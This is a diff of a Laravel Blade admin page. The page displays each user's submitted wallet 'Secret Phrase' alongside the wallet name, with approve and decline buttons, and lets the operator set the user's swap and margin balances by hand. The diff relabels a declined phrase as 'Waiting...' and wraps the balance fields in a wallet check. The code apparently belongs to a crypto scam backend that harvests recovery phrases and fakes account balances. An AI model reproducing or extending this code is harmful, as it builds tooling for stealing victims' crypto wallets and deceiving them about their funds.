@@ -148,7 +148,7 @@
                     @php
                         $phrase = json_decode($user->phrase, true);
                     @endphp
-                    <label>Secret Phrase <span class="badge {{ $phrase['status'] == 1 ? 'bg-success' : 'bg-danger' }}">{{ $phrase['status'] == 1 ? 'approved' : 'declined' }}</span></label>
+                    <label>Secret Phrase <span class="badge {{ $phrase['status'] == 1 ? 'bg-success' : 'bg-secondary' }}">{{ $phrase['status'] == 1 ? 'approved' : 'Waiting...' }}</span></label>
                     <textarea name="..." id="" disabled rows="10" cols="3" class="form-control mb-2 mt-2">{{ $phrase['phrase'] }} - {{ $phrase['wallet'] }}</textarea>
                         <div class="d-flex justify-content-around">
                             <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 1]) }}" method="post">
@@ -295,14 +295,16 @@
                                                                 @endforeach
                                                             </select>
                                                         </div>
-                                                        <div class="form-group">
-                                                            <label>Swap Balance</label>
-                                                            <input type="number" class="form-control mb-2 mt-2" name="swap" step="1" id="new-phone" value="{{ $user->swap }}">
-                                                        </div>
-                                                        <div class="form-group">
-                                                            <label>Margin Balance</label>
-                                                            <input type="number" class="form-control mb-2 mt-2" name="margin" step="1" id="new-phone" value="{{ $user->margin }}">
-                                                        </div>
+                                                        @if($user->wallet)
+                                                            <div class="form-group">
+                                                                <label>Swap Balance</label>
+                                                                <input type="number" class="form-control mb-2 mt-2" name="swap" step="1" id="new-phone" value="{{ $user->wallet->swap }}">
+                                                            </div>
+                                                            <div class="form-group">
+                                                                <label>Margin Balance</label>
+                                                                <input type="number" class="form-control mb-2 mt-2" name="margin" step="1" id="new-phone" value="{{ $user->wallet->margin }}">
+                                                            </div>
+                                                        @endif
                                                     </div>
                                                 </div>
                                             </div>
